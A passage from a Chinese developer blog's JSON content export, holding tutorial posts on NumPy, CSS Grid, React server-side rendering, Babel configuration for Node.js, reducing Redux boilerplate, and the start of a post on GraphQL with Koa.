[2,3,4,5]print(x[0:4:2]) # [1,3]，0, 4 是边界，2 指的是下标增 2x = numpy.array([[1, 2], [3, 4], [5, 6]])print(x[:2]) # [[1 2], [3 4]]print(x[:2, :1]) # [[1],[3]]，0 - 2 行，0 - 1 列x[:2, :1] = 0 # 用标量赋值print(x) # [[0,2], [0,4], [5,6]]x[:2, :1] = [[8], [6]] # 用数组赋值print(x) # [[8,2],[6,4],[5,6]] 转置ndarray 的转置是复制操作，不是引用操作。 转置的规则是行列置换，学过线性代数都懂。 1234567891011121314151617181920212223242526import numpy as npprint(np.arange(1, 10, 2)) # 等差数列，差为 2# 生成一个序号数组，再把一维拆为二维：3 x 3k = np.arange(9).reshape(3, 3)''' [0 1 2] [3 4 5] [6 7 8]'''print(k) # 正常''' [0 3 6] [1 4 7] [2 5 8]'''print(k.T) # 转置 k[x][y] = k[y][x]'''[5 14 23][14 50 86][23 86 149]'''print(np.dot(k, k.T)) # 点积（矩阵相乘） 随机数Numpy 里对随机数的支持简直就是佩服。 12345678import numpy as npprint(np.random.rand()) # 浮点数随机数print(np.random.rand(2, 3)) # 生成一个随机数矩阵 2 x 3print(np.random.randint(1, 100)) # 整数随机数print(np.random.randn()) # 正态分布随机数print(np.random.choice([1, 3, 5])) # 随机数限制在数组里print(np.random.beta(1, 10, 10,)) # beta 分布随机数 a = 1, b = 10, size = 10 参考资料 http://python.usyiyi.cn/translate/NumPy_v111/reference/index.html https://matplotlib.org/examples/index.html http://python.usyiyi.cn/translate/Pandas_0j2/index.html http://python.usyiyi.cn/translate/scipy_lecture_notes/intro/scipy.html","categories":[{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/categories/Python/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Python","slug":"Python","permalink":"http://me.lizhooh.com/tags/Python/"},{"name":"大数据","slug":"大数据","permalink":"http://me.lizhooh.com/tags/大数据/"}]},{"title":"深入学习 CSS 网格布局（Grid）","slug":"CSS/深入学习 CSS 网格布局（Grid）","date":"2018-02-01T06:09:41.000Z","updated":"2021-06-15T06:10:52.809Z","comments":true,"path":"/stories/2018/02/CSS/深入学习 CSS 网格布局（Grid）/","link":"","permalink":"http://me.lizhooh.com/stories/2018/02/CSS/深入学习 CSS 网格布局（Grid）/","excerpt":"前言CSS 网格布局可以使我们能够比以往任何时候都可以更灵活构建和控制自定义网格，甚至是比 Flexbox 布局还有灵活以及语意化。 CSS 网格布局用于将页面分割成数个主要区域","text":"前言CSS 网格布局可以使我们能够比以往任何时候都可以更灵活构建和控制自定义网格，甚至是比 Flexbox 布局还有灵活以及语意化。 CSS 网格布局用于将页面分割成数个主要区域 兼容性浏览器对 CSS Grid 的兼容性： https://caniuse.com/#feat=css-grid主流的现代浏览器都支持，ie11 需要加前缀 -ms。 基本知识CSS 网格布局的属性以 grid-* 为前缀开头。基本的网格元素包括了： container 容器。 rows 行元素。 columns 列元素。 在 grid 布局里最常用的的几个属性是： display: grid; 指定为 grid 布局 grid-template-columns; 定义网格中的列大小 grid-template-rows; 定义网格中的行大小 grid-auto-columns; 定义自动布局的列大小 grid-auto-rows; 定义自动布局的行大小 grid-columns; 定义列网格线 grid-columns-start; grid-columns-end; grid-columns-gap; grid-rows; 定义行网格线 grid-rows-start; grid-rows-end; grid-rows-gap; 单元格与区域一个网格单元是在一个网格元素中最小的单位， 从概念上来讲其实它和表格的一个单元格很像。 网格项目可以向行或着列的方向扩展一个或多个单元，并且会创建一个网格区域。网格区域的形状必须是一个矩形。 grid-template-*grid-template-* 是用来定义网格中的行或列大小的。 比较常见的用法是： grid-template-columns: 200px 200px 200px; 固定大小 grid-template-columns: 1fr 1fr 1fr; 比例伸缩 grid-template-columns: repeat(3, 1fr); 分为三列，每列都是 1 伸缩比例 grid-template-columns: repeat(2, 1fr, 2fr); 分为四列，第 1，3 列为 1fr，而 2，4 列为 2fr grid 的排序是从左到右，从上到下，如果一行的项过多就会自动挤到下一行。grid-template-rows 与 grid-template-columns 用法一样。grid-template-* 的参数位置代表着每列或行的位置，不能使用一个表示全部。 下面的代码把页面分为 3 列 2 行。 123456789101112131415&lt;style&gt;.wrapper &#123; display: grid; grid-template-columns: repeat(3, 1fr); grid-template-rows: 100px 200px;&#125;&lt;/style&gt;&lt;div class=\"wrapper\"&gt; &lt;div&gt;A&lt;/div&gt; &lt;div&gt;B&lt;/div&gt; &lt;div&gt;C&lt;/div&gt; &lt;div&gt;D&lt;/div&gt; &lt;div&gt;E&lt;/div&gt;&lt;/div&gt; grid-auto-*grid-auto-* 是用于定义自动布局的行或列的大小。 比较常见的用法是： grid-auto-rows: 200px; 所有的行指定其大小 grid-auto-rows: 1fr; 所有的行指定其伸缩比例 grid-auto-rows: minmax(100px, auto); 所有的行指定其大小，并指定了范围 grid-auto-* 是用于指定所有的行、列的，minmax 表示了一个范围大小。 grid-*grid-* 是用于定义行或列网格线的，更多的是用于跨行或列布局的。 比较常见的用法是： grid-columns-start: 1; 列开始线 grid-columns-end: 4; 列结束线 grid-rows-start: 2; 行开始线 grid-rows-end: 3; 行结束线 具体看下面的示例： 12345678910111213141516171819202122232425&lt;style&gt;.wrapper &#123; display: grid; grid-template-columns: repeat(3, 1fr); grid-auto-rows: 100px;&#125;.box1 &#123; grid-column-start: 1; grid-column-end: 4; grid-row-start: 1; grid-row-end: 3;&#125;.box2 &#123; grid-column-start: 1; grid-row-start: 3; grid-row-end: 5;&#125;&lt;/style&gt;&lt;div class=\"wrapper\"&gt; &lt;div class=\"box1\"&gt;A&lt;/div&gt; &lt;div class=\"box2\"&gt;B&lt;/div&gt; &lt;div&gt;C&lt;/div&gt; &lt;div&gt;D&lt;/div&gt; &lt;div&gt;E&lt;/div&gt;&lt;/div&gt; 现在为它添加一些辅佐线，这样就可以清晰的知道网格线的用法了。 在上图里（放大）红线表示网格的列线，蓝线表示网格的行线。 参考资料 网格布局的基本概念 - CSS | MDN grid layout 和其它布局方法的联系 - CSS | MDN","categories":[{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/categories/CSS/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/tags/CSS/"}]},{"title":"React 服务端渲染实践记录","slug":"React/Universal 同构/React 服务端渲染实践记录","date":"2018-01-28T02:33:26.000Z","updated":"2021-06-15T06:10:52.887Z","comments":true,"path":"/stories/2018/01/React/Universal 同构/React 服务端渲染实践记录/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/React/Universal 同构/React 服务端渲染实践记录/","excerpt":"前言SSR 是一个比 SPA 更上一层，并且难度更大的一个应用模式。国内很多大厂都渐渐的使用了 SSR 的架构，比如知乎，bilibili 等网站。SSR 它很直接的继承了 SPA 的特点，并且弥补了 SPA 缺点，可以说是一个非常值得尝试的选择。 本文旨在研究 React SSR 并且说明如何与 React-Router、Redux、styled-components 结合使用，并且写了一个仿知乎专栏 React SSR 的 Demo。","text":"前言SSR 是一个比 SPA 更上一层，并且难度更大的一个应用模式。国内很多大厂都渐渐的使用了 SSR 的架构，比如知乎，bilibili 等网站。SSR 它很直接的继承了 SPA 的特点，并且弥补了 SPA 缺点，可以说是一个非常值得尝试的选择。 本文旨在研究 React SSR 并且说明如何与 React-Router、Redux、styled-components 结合使用，并且写了一个仿知乎专栏 React SSR 的 Demo。 SSR 原理SSR 原理以及注意事项，参考之前写的一篇：React 服务端渲染特别说一下是： renderToString 需要的是前端的 React 代码，因为需要渲染出来的结构统一，所以 SSR 基本可以说是一个同构应用。 实践 Demo下面是的代码，绝大部分都来自于这个 demo：仿知乎专栏 React SSR Demo有兴趣的同学，可以去运行一下应用，看看 React SSR 的效果。 开发配置因为我个人比较懒，不想写 Webpack 的配置，而是使用比较简单零配置的 Parcel 进行代码打包。 在后端里使用 babel-polyfill 配置 ES6+ 环境，而前端代码使用 Parcel 编译。 Parcel 配置 ES6 环境的一个神奇错误：🐛 Can’t get rid of “Missing class properties” error，解决的方案是：1234567&#123; \"presets\": [\"env\", \"react\", \"stage-2\"], \"plugins\": [ \"transform-class-properties\", \"transform-es2015-classes\" ]&#125; 对于前端 React 的配置，可以参考官网的配置：https://parceljs.org/recipes.html对于后端 Nodejs 的配置，可以参考本博客的一篇文章：如何在 Nodejs 里使用 ES6+ 语法？ getInitialPropsState参考 Next.js 的做法，为 React 声明周期提供了一个 getInitialProps 静态函数，这个函数仅用于 page 组件上，提供一些上下文数据。 在这里我简单的定义一个 getInitialPropsState 函数，这个函数的作用是会自动活动 window.__INIT_STATE__ 的数据，并将返回的对象嵌进组件的 this.props.state 里。 并且它会在组件装载之前被调用，比 constructor 还先调用。 12345678910111213141516// pages/views/index.jsexport default class IndexView extends Component &#123; static getInitialPropsState(&#123; state &#125;) &#123; return state; &#125; componentDidMount() &#123; console.log(this.props.state); // 与上面的 state 相同 &#125; render() &#123; return ( &lt;div&gt; &lt;p&gt;Hello&lt;/p&gt; &lt;/div&gt; ); &#125;&#125; 那么如何实现这个功能呢？主要是在组件之外包装一层函数，这样就可以形成一个闭包类。 12345678910// /pages/main.js// 调用 getInitialPropsState 函数const C = item.component;const initProps = isFunction(C.getInitialPropsState) ? C.getInitialPropsState(data) : &#123;&#125;;// 有返回值if (initProps) &#123; const newC = p =&gt; &lt;C &#123;...p&#125; state=&#123;initProps&#125; /&gt; return &lt;Route key=&#123;`route-$&#123;index&#125;`&#125; &#123;...item&#125; component=&#123;newC&#125; /&gt;&#125;return &lt;Route key=&#123;`route-$&#123;index&#125;`&#125; &#123;...item&#125; component=&#123;C&#125; /&gt; 首先，判断 getInitialPropsState 是否是函数，之后调用它并获取返回值，接着把返回值嵌入组件里，再构造一个新的组件。 结合 styled-components结合 styled-components 做服务端渲染，需要在 &lt;App /&gt; 外包裹一层，最后获取到了 style 再插入 html 模版里即可。 123456789101112131415161718// render.jsimport React from 'react';import &#123; renderToString &#125; from 'react-dom/server';import &#123; ServerStyleSheet &#125; from 'styled-components';// ...const App = require('./pages/main.js').default;const sheet = new ServerStyleSheet();const body = renderToString( &#123;sheet.collectStyles( &lt;App data=&#123;&#123; state: ctx.state &#125;&#125; /&gt; )&#125;);// 渲染 html 模版const html = replaces(ctx.app.cache.get('page-index'), &#123; style: sheet.getStyleTags(), body: body, sctipt: `/static/main.js`,&#125;); 结合 react-router 4对于路由来说，分为前端路和后端路由。当用户在浏览器上输入地址访问时，后端会根据 url 初始化前端需要的数据，之后的路由将由前端接管。 具体的流程如下： 在服务端渲染使用 React-Router，则需要在 &lt;App /&gt; 外面使用 &lt;StaticRouter&gt; 包裹，并把 url 传递给 location 属性。这样 React-Router 才会知道渲染的是哪个 view。初始路由是在服务端初始化数据，之后的路由管理移交给前端管理。 1234567891011121314// /render.jsconst body = renderToString( &lt;StaticRouter context=&#123;&#123;&#125;&#125; location=&#123;ctx.url&#125;&gt; &#123;sheet.collectStyles( &lt;App data=&#123;&#123;ctx.state&#125; /&gt; )&#125; &lt;/StaticRouter&gt;);// 渲染 html 模版const html = replaces(ctx.app.cache.get('page-index'), &#123; style: sheet.getStyleTags(), body: body, sctipt: `/static/main.js`,&#125;); 结合 redux如果要使用 redux 那就更麻烦了，实际上单独使用 React 做 SSR 没什么难道，要加上 react-router 会难一点，但是还要使用 redux 的话那就会上升到另一个难度。 结合 redux 一起使用需要创建一个 store，然后在 &lt;App /&gt; 之外包裹一层 &lt;Provider /&gt;。 需要在做以下处理。 123456789101112131415161718192021// /pages/app.jsimport &#123; Provider &#125; from 'react-redux';import reducers from './redux/reducers';import Store from 'redux-store-init';import isEnv from 'is-env';import routes from './routes';const App = (&#123; data &#125;) =&gt; ( &lt;Provider store=&#123;Store(&#123; reducers: reducers(data) &#125;)&#125;&gt; &lt;Switch&gt;&#123; // 根据路由表动态渲染路由 routes.map((item, index) =&gt; &#123; // ... 忽略中间的代码 &#125;) &#125; &lt;/Switch&gt; &lt;/Provider&gt;);export default App; 这样大致的组件结构是：&lt;BrowserRouter&gt; -&gt; &lt;Provider&gt; -&gt; &lt;Switch&gt; -&gt; &lt;Route&gt; -&gt; &lt;View&gt;。 Store 的初始化数据统一在 App 组件的 data 属性里获取，而 data 属性在服务端时的赋值为 ctx.state，在客户端时赋值为 window.__INIT_STATE__（数据是一样的）。 123456789101112131415161718192021222324// /pages/main.jshydrate( &lt;BrowserRouter&gt; &lt;App data=&#123;window.__INIT_STATE__&#125; /&gt; &lt;/BrowserRouter&gt;, document.getElementById('app'));// /render.jsconst body = renderToString( &lt;StaticRouter context=&#123;&#123;&#125;&#125; location=&#123;ctx.url&#125;&gt; &#123;sheet.collectStyles( &lt;App data=&#123;ctx.state&#125; /&gt; // 数据源 )&#125; &lt;/StaticRouter&gt;);// 渲染 html 模版const html = replaces(ctx.app.cache.get('page-index'), &#123; style: sheet.getStyleTags(), body: body, state: JSON.stringify(ctx.state), // 这里就是 window.__INIT_STATE__ sctipt: `/static/main.js`,&#125;); 而 reducers.js 里的代码长成这样： 123456789101112131415161718192021222324import isFunction from 'is-function';// 初始化 reducersexport default (INIT_STATE) =&gt; &#123; const index_init_state = INIT_STATE.index || &#123;&#125;; const detail_init_state = INIT_STATE.detail || &#123;&#125;; return &#123; // 主页 index: (state = index_init_state, action) =&gt; &#123; if (action.type = 'index' &amp;&amp; isFunction(action.newState)) &#123; return action.newState(state, index_init_state) || state; &#125; return state; &#125;, // 详细页 detail: (state = detail_init_state, action) =&gt; &#123; if (action.type = 'detail' &amp;&amp; isFunction(action.newState)) &#123; return action.newState(state, detail_init_state) || state; &#125; return state; &#125;, &#125;&#125; ctx.state 在 Koa 处进行初始化赋值： 123456789101112131415router .get('/', async (ctx, next) =&gt; &#123; // 初始化数据首页数据 const [info, list] = await Promise.all([ api.any('/api/columns/qianduanzhidian'), api.any('/api/columns/qianduanzhidian/posts'), ]); // 专栏信息, 专栏文章列表 ctx.state.index = &#123; info, list &#125;; await next(); // 流到下一个中间件也就是 get('/*') &#125;) .get('/*', async (ctx, next) =&gt; &#123; const html = render(ctx, 'main'); ctx.body = html; &#125;) 数据的流动如下： 路由部分的路线如下： 小结以亲身经历来述说： SSR 需要共用一套代码，这就意味着需要前后端环境的判断。我使用的是我之前写一个 npm 包：is-env 来判断环境。 React 组件在服务端渲染只有 componentDidMount 之前的生命周期方法会被执行。所以注意一些声明周期里判断以下环境。 SSR 开发起来并不简单，特别是几个框架一起使用的时候，同时也给服务端带来一定的压力。 SSR 所带来的好处除了 SEO 外，还有一个很明显的特征那就是减少了客户端初始化的时间，从而提供用户体验。 除了自己手动写基础 SSR 框架外，更推荐使用第三方的，比如 Next.js、After.js。 参考资料 http://reacttraining.cn/web/guides/server-rendering https://www.styled-components.com/docs/advanced#server-side-rendering","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"服务端渲染","slug":"服务端渲染","permalink":"http://me.lizhooh.com/tags/服务端渲染/"}]},{"title":"如何在 Nodejs 里使用 ES6+ 语法？","slug":"Nodejs/如何在 Nodejs 里使用 ES6+ 语法？","date":"2018-01-21T13:21:21.000Z","updated":"2021-06-15T06:10:52.844Z","comments":true,"path":"/stories/2018/01/Nodejs/如何在 Nodejs 里使用 ES6+ 语法？/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/Nodejs/如何在 Nodejs 里使用 ES6+ 语法？/","excerpt":"前言到目前为止 Nodejs 还是不能 100% 支持 ES6+ 语法，如果想体验 ES6+ 或者是项目是面向未来的，可以使用 Babel 来配置。唯一有点不好是，Babel 转换之后代码会沉渣，可能会有些微妙的性能差别。","text":"前言到目前为止 Nodejs 还是不能 100% 支持 ES6+ 语法，如果想体验 ES6+ 或者是项目是面向未来的，可以使用 Babel 来配置。唯一有点不好是，Babel 转换之后代码会沉渣，可能会有些微妙的性能差别。 配置 Babel配置 Babel 先安装模块。 stage-2 指的是支持通过草案 2 的语法，数字（0-3）越大越接近现实。stage-0 是一个万金油配置，但是会面临着不通过的语法被废弃的问题。 安装： 123456789npm install --save-dev babel-corenpm install --save-dev babel-polyfillnpm install --save-dev babel-preset-latest-nodenpm install --save-dev babel-preset-stage-2# oryarn add --dev babel-coreyarn add --dev babel-polyfillyarn add --dev babel-preset-latest-nodeyarn add --dev babel-preset-stage-2 安装完成后写一个启动文件 start.js： 1234567891011121314// start.jsrequire('babel-core/register')(&#123; ignore: [/node_modules/], presets: [ 'stage-2', [ \"latest-node\", &#123; \"target\": \"current\" &#125; ] ]&#125;);require('babel-polyfill');require('./index'); 有个问题要注意的： Babel 默认只转换新的 JavaScript 语法（syntax），而不转换新的 API，比如 Iterator、Generator、Set、Maps、Proxy、Reflect、Symbol、Promise 等全局对象，以及一些定义在全局对象上的方法（比如 Object.assign）都不会转码。 示例1234567891011// index.jsimport Koa from 'koa';const app = new Koa();app.use(ctx =&gt; &#123; ctx.body = 'Hello';&#125;);app.listen(3000, () =&gt; &#123; console.log('server run in 3000');&#125;); 文件目录： 123- app - start.js // 启动文件，发生编译 - index.js // 入口文件 启动的时候应该是 node start.js，在 start.js 里 require(&#39;index&#39;)。 React SSR想玩一下 React 服务端渲染，那就可以把 React 也配置上，主要是 JSX 语法的支持。 安装： 1234567891011npm install --save-dev babel-corenpm install --save-dev babel-polyfillnpm install --save-dev babel-preset-latest-nodenpm install --save-dev babel-preset-stage-2npm install --save-dev babel-preset-react# oryarn add -dev babel-coreyarn add -dev babel-polyfillyarn add -dev babel-preset-latest-nodeyarn add -dev babel-preset-stage-2yarn add -dev babel-preset-react 安装完成后写一个启动文件 start.js： 123456789101112131415// start.jsrequire('babel-core/register')(&#123; ignore: [/node_modules/], presets: [ 'stage-2', 'react', [ \"latest-node\", &#123; \"target\": \"current\" &#125; ], ]&#125;);require('babel-polyfill');require('./index'); 示例12345678910111213141516171819// index.jsimport Koa from 'koa';import React from 'react';import &#123; renderToString &#125; from 'react-dom/server';const app = new Koa();app.use(ctx =&gt; &#123; const html = renderToString( &lt;div&gt; &lt;h1&gt;Hello&lt;/h1&gt; &lt;/div&gt; ); ctx.body = html;&#125;);app.listen(3000, () =&gt; &#123; console.log('server run in 3000');&#125;); 到这里就完成了一个超级简单的 React SSR。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"精减 Redux 代码量","slug":"Redux/精减 Redux 代码量","date":"2018-01-17T01:07:45.000Z","updated":"2021-06-15T06:10:52.894Z","comments":true,"path":"/stories/2018/01/Redux/精减 Redux 代码量/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/Redux/精减 Redux 代码量/","excerpt":"前言在 React 中使用 Redux 带来的不仅仅是数据状态的易维护性，还带来的是代码量的提升。事物总有好的一方面也有坏的一方面，使用 Redux 后，项目的代码量会增加很多，这是人人皆知的事情。 为了解决这种困境，今天来谈谈 Redux 代码多在哪里，如何去精减 Redux 的代码量。从另一个角度看，完全是为了减少工作量，提高开发效率。","text":"前言在 React 中使用 Redux 带来的不仅仅是数据状态的易维护性，还带来的是代码量的提升。事物总有好的一方面也有坏的一方面，使用 Redux 后，项目的代码量会增加很多，这是人人皆知的事情。 为了解决这种困境，今天来谈谈 Redux 代码多在哪里，如何去精减 Redux 的代码量。从另一个角度看，完全是为了减少工作量，提高开发效率。 代码多在哪里开始学习 Redux 的时候会很不习惯，Redux 似乎多了很多代码。 在很久很久以前，通常我的 redux 目录结构是这样： 123456789101112131415├── redux│ ├── actions│ │ ├── home.js│ │ └── about.js│ ││ ├── reducers│ │ ├── home.js│ │ └── about.js│ ││ ├── types.js // 所有的 type│ └── store.js│├── views│ ├── home.js│ └── about.js 一开始觉得这种方案非常好，每个 view 都对应着一个 reducer 和 action 文件，一眼都知道去哪个文件里找哪个内容，当时感觉上是觉得很好维护的。 但是，后来我发现这样很不好。但 view 逐渐增多是需要创建的文件就非常多，如果遇到需要改文件名字的情况，那就要该四个文件（外加 style 文件），简直没完没了的。 这就是 Redux 代码多的原因，你必须编写对应的 type，还要编写对应的 reducer 和 action，最后还要连接 React 组件。 StoreStore 的初始化基本都是一个定值，只有在特定的情况下才会有所改变。 基本的 Store 初始化代码如下： 12345678910111213141516171819202122232425262728293031import &#123; createStore, combineReducers, compose, applyMiddleware,&#125; from 'redux';import thunk from 'redux-thunk';import * as reducers from './reducers';const hasReduxTool = !!window.__REDUX_DEVTOOLS_EXTENSION__;const devtool = (open) =&gt; ( // 开启 redux devtool open &amp;&amp; hasReduxTool &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());// 中间件const middleware = () =&gt; &#123; return hasReduxTool ? compose(applyMiddleware(thunk), devtool(true)) : applyMiddleware(thunk);&#125;;export default createStore( combineReducers(&#123; ...reducers, &#125;), middleware(),); 因此，我们可以把 Store 的初始化代码打包成一个 npm 包，用的时候直接 install 后，配置一下就可以省了很多重复的编写，不如的会每次新项目都写这些初始化代码不无聊吗。 最后会简约为： 123import Store from 'redux-store-init';import * as reducers from './reducers';export default new Store(&#123; reducers &#125;); 可以使用我封装的包： redux-store-init reducers，actions现在已经不推荐把 reducer 和 action 分开在两个文件里了，因为后来发现 reducer 和 action 的分开在两个文件里后更难操作，因此选择了把它们写在同一个文件里的做法。 除了这个问题外，还面临一个问题，那就是 reducers 里需要写很长很多的 case。 例如，对于一个列表 listview 来说，它可能会有好几个这样的 case。 1234567891011121314151617181920212223242526export default (state = init_state, action) =&gt; &#123; switch (action.type) &#123; case LISTVIEW.load_init: return &#123; ...state, list: action.list, &#125; case LISTVIEW.load_more: return &#123; ...state, // other &#125; case LISTVIEW.add_item: return &#123; ...state, // other &#125; case LISTVIEW.remove_item: return &#123; ...state, // other &#125; case LISTVIEW.update_item: return &#123; ...state, // other &#125; case LISTVIEW.reset_state: init_state, default: return state; &#125;&#125; 看到上面的一堆 case 就觉得不好受了。 这样带来的麻烦是，先需要在 types.js 文件里添加相应的 type，接着在 action 里编写函数，最后在 reducer 里捕获 action.type 返回对应的状态。 好，为了解决 case 的问题，现在不使用 switch，而是在 action 里进行返回新的 state。 代码量，精减为： 123456789101112131415161718// reducerexport default (state = init_state, action) =&gt; &#123; if (!!~action.type.indexOf('LISTVIEW')) &#123; return action.newState(state, init_state) || state; &#125; return state;&#125;// actionexport const loadInit = () =&gt; async (dispatch, getState) =&gt; &#123; const res = await api.getList(); dispatch(&#123; type: LISTVIEW.load_init, newState: (state, action) =&gt; (&#123; list: res.data, &#125;), &#125;);&#125; 这样一下只就把 switch、case 去掉，代码变得非常简短，而且每次添加 type 时都不需要写 case 了。返回新的 state，通过 闭包的特性 在 loadInit 上下文里获取到 res.data，这样再也不需要在 case 里写 action.xxx 的赋值了。 不过在上面，因为使用了 indexOf 进行模糊查询，从性能上看肯定不如 switch。 如果非常在意这些小的性能差异，我们可以约定一个 type 格式： 类型为字符串，第一个字母为大写，并与第二个字母用 &#39;-&#39; 分割。 1234const LISTVIEW = &#123; load_init: 'L-load_init', load_more: 'L-load_more',&#125;; 此时 reducer 改为： 123456export default (state = init_state, action) =&gt; &#123; if (action.type[0] === 'L') &#123; return action.newState(state, init_state) || state; &#125; return state;&#125; 这样基本没什么性能消耗了（滑稽 →_→）。 或者在 action 里使用一个 key 来限制，这样连 type 都省了 （滑稽 →_→）。 123456export default (state = init_state, action) =&gt; &#123; if (action.key === 1) &#123; return action.newState(state, init_state) || state; &#125; return state;&#125; typestypes.js 主要是为了集中管理 action.type，常见如下： 123456// 登录export const LOGIN = &#123; reset_state: 'LOGIN-RESET-STATE', update_from: 'LOGIN-UPDATE-FROM', submit_from: 'LOGIN-SUBMIT-FROM',&#125;; 后来发现了需要写很多 _success 这种状态 type，感觉这是一种重复做功运动。 为了解决这个问题，编写一个自动扩展函数，扩展类型。 123456789101112131415// 扩展状态类型const extendState = (obj, extendType = ['in', 'fail', 'success', 'complete']) =&gt; &#123; Object.keys(obj).forEach(key =&gt; &#123; extendType.forEach(i =&gt; &#123; obj[key + '_' + i] = obj[key] + '-' + i.toLocaleUpperCase(); &#125;); &#125;); return obj;&#125;;export const LOGIN = extendState(&#123; reset_state: 'LOGIN-RESET-STATE', update_from: 'LOGIN-UPDATE-FROM', submit_from: 'LOGIN-SUBMIT-FROM',&#125;); 精减代码精减代码，去除复杂的 reducer 结构，去除 types 文件，此时文件变得非常少，代码量也少了很多。 123456789├── redux│ ├── home.js // action│ ├── about.js // action| ├── reducers.js // 所有 reducer 的集合│ └── store.js│├── views│ ├── home.js│ └── about.js reducer、action 写在一个文件里，比如： 123456789101112131415161718192021// home.jsconst init_state = &#123; list: [],&#125;;// reducerexport default (state = init_state, action) =&gt; &#123; if (!!~action.type.indexOf('LISTVIEW') &amp;&amp; isFunction(action.newState)) &#123; return action.newState(state, init_state) || state; &#125; return state;&#125;// actionexport const loadInit = () =&gt; async (dispatch, getState) =&gt; &#123; const res = await api.getList(); dispatch(&#123; type: 'LISTVIEW.load_init', newState: (state, action) =&gt; (&#123; ...state, list: res.data &#125;), &#125;);&#125; 在 reducers.js 文件里主要把 reducer 的分支进行合并，类似的有： 1234567891011const root_state_init = &#123; app: 'xxx', version: '1.0.0',&#125;export default (state = root_state_init, action) =&gt; &#123; return state;&#125;export &#123; default as home &#125; from './home';export &#123; default as about &#125; from './about'; 好了，到这里已经做了很多代码精减了（其实还有很多还可以精减的）。 中间件有时候，一些累赘的代码，我们可以像 Express / Koa 一样，把它们编写成中间件。在 Redux 里，也同样支持中间件，它是存在于 action 到 reducer 之间的一段道路中。 那么如何编写中间件呢？Redux 的中间件是一个多层的闭包函数，每一层都有不同的接收参数，下面是一个 logger 的中间件。 123456const logger = store =&gt; next =&gt; action =&gt; &#123; console.log(action); const result = next(action); console.log('next state', store.getState()); return result;&#125; 其中 next(action) 类似于 store.dispatch(action)。next 的作用是能让当前的中间件传递给下一个中间件，所以 next(action) 只能说是类似于 dispatch(action)。 调试去掉 switch 后，还有一个好处就是可以很方便的写一个统一接口进行调试。 在总的 reducers 里添加一个调试接口，显示当前 redux 操作时间。 12345678910if (action.note) &#123; const start = Date.now(); setTimeout(() =&gt; &#123; console.log( '%c%s %c%s', 'color: #36f', `[$&#123;(new Date()).toString().replace(/.*(\\d&#123;2&#125;:\\d&#123;2&#125;:\\d&#123;2&#125;).*/, '$1')&#125; | $&#123;Date.now() - start&#125; ms]`, 'color: #f45', `note: $&#123;action.note&#125;` ); &#125;, 0);&#125; 其中利用的是把输出的信息放到当前的 tick 的末尾去，这样就可以等到 redux 广播完毕才输出 log（这里的时间是包括了 redux 和 react 渲染两部分）。 这里的 note 是自己手动添加的： 12345dispatch(&#123; type: \"MUSIC\", node: \"音乐列表 - 初始化\" newState: state =&gt; state,&#125;); 面临一些问题做任何事情都是有代价的，代码是精简了不少，但是面临着许多问题。比如： 如果需要做跨组件数据通信，可能指定几个 action.type 即可，现在可不一样了。 精简之后，日志不好查看，可以使用 redux-diff-logger。 1234import logger from 'redux-diff-logger';import Store from 'redux-store-init';// ...export default Store(&#123; ...reducers &#125;, [logger]); 小结要记住 reducer 只是一个函数，对 reducer 的优化，这只是冰山一角。在 reducer 里除了 switch 语句，还可以使用条件逻辑，切片函数，对象组合等方式，也可以调用其他函数，这完全取决于你的设计能力。在社区上有大量这样的优化工具，可以正在 Redux Addons 目录里查看。","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"GraphQL 结合 Koa 实践体验","slug":"GraphQL/GraphQL 结合 Koa 实践体验","date":"2018-01-12T12:28:04.000Z","updated":"2021-06-15T06:10:52.820Z","comments":true,"path":"/stories/2018/01/GraphQL/GraphQL 结合 Koa 实践体验/","link":"","permalink":"http://me.lizhooh.com/stories/2018/01/GraphQL/GraphQL 结合 Koa 实践体验/","excerpt":"前言前段时间有空去看了一天的 GraphQL 文档，对 GraphQL 也有些理解了。今天有空把 GraphQL 与 Koa 结合起来实际一把，其中还掺杂着 Mongodb。 本文会先介绍 GraphQL，接着使用 Koa 搭建 http 服务，使用 Mongodb 存储数据，结合 GraphQL 搭建丰富的 Web API 服务。","text":"前言前段时间有空去看了一天的 GraphQL 文档，对 GraphQL 也有些理解了。今天有空把 GraphQL 与 Koa 结合起来实际一把，其中还掺杂着 Mongodb。 本文会先介绍 GraphQL，接着使用 Koa 搭建 http 服务，使用 Mongodb 存储数据，结合 GraphQL 搭建丰富的 Web API 服务。 GraphQLGraphQL 既是一种用于 API 的查询语言也是一个满足你数据查询的运行时，由 Facebook 开源在 Github 上。GraphQL 对你的 API 中的数据提供了一套易于理解的完整描述，使得客户端能够准确地获得它需要的数据，而且没有任何冗余，也让 API 更容易地随着时间推移而演进，还能用于构建强大的开发者工具。 它有非常简单的描述方法，只需要描述你的数据： 12345type Project &#123; name: String tagline: String contributors: [User]&#125; 接着请求你的想要的数据： 12345&#123; project(name: \"GraphQL\") &#123; tagline &#125;&#125; 那么就可以得到可预测的结果： 12345&#123; \"project\": &#123; \"tagline\": \"A query language for APIs\" &#125;&#125; 对于 